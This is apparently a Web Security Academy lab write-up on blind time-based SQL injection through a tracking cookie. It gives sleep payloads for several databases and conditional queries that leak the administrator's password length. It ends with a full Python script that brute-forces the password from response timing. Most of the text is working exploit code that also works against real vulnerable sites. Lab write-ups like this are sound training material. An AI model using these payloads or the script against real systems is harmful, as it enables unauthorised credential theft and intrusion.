#Step 1:

Hidden trials, check any of these are working or not.

'|| pg_sleep(10) ||'			[this works for me, which means there is postgreSQL in backend.] 
'|| sleep(10) ||'
'||WAITFOR DELAY '0:0:10' ||'
'|| dbms_pipe.receive_message(('a'),10) ||'


You can also try these queries like this :-

'|| pg_sleep(10) --

#Step 2:

'|| (SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(0) END) ||'

Check the server fulfills these condition or not, in my case when condition is true the server delay response for 10 seconds. And while condition is false then server response immediately.


#Step 3: Find the length of password.

'|| (SELECT CASE WHEN (length((select password from users where username = 'administrator')) = 20 ) THEN pg_sleep(10) ELSE pg_sleep(0) END) ||'

In my case 20 is the length of administrator's password.


#Step 4: Brute the password with the following python script.


I set the elapsed time to 2 seconds. But you can also set it to 10 seconds for more reliablility, but 2 seconds works for me.



#Python Script:-

import requests
import string

url = 'https://0a48004e03047267809f2b2e005400f5.web-security-academy.net/filter?category=Tech+gifts'
session_cookie = 'RqS19hXCmiH9FFMyOaIlfmIhfdnajmVi'

def get_length():
    for i in range(1, 100):
        cookie = {'TrackingId': '', 'session': session_cookie}
        payload = f"'||(SELECT CASE WHEN (length((select password from users where username = 'administrator')) = {i}) THEN pg_sleep(2) ELSE pg_sleep(0) END)||'"
        cookie['TrackingId'] = payload
        r = requests.get(url, cookies=cookie)
        if r.elapsed.total_seconds() > 2:
            return i
    return None

def brute_force_password(length):
    password = ''
    characters = string.ascii_letters + string.digits  # All possible characters
    for i in range(1, length + 1):
        for char in characters:
            cookie = {'TrackingId': '', 'session': session_cookie}
            payload = f"'||(SELECT CASE WHEN (substr((select password from users where username = 'administrator'), {i}, 1) = '{char}') THEN pg_sleep(2) ELSE pg_sleep(0) END)||'"
            cookie['TrackingId'] = payload
            r = requests.get(url, cookies=cookie)
            if r.elapsed.total_seconds() > 2:
                password += char
                print(f"Found character {i}: {char}")
                break
    return password

length = get_length()
if length:
    print(f"Length is {length}")
    password = brute_force_password(length)
    print(f"Password is {password}")
else:
    print("Failed to determine the password length.")


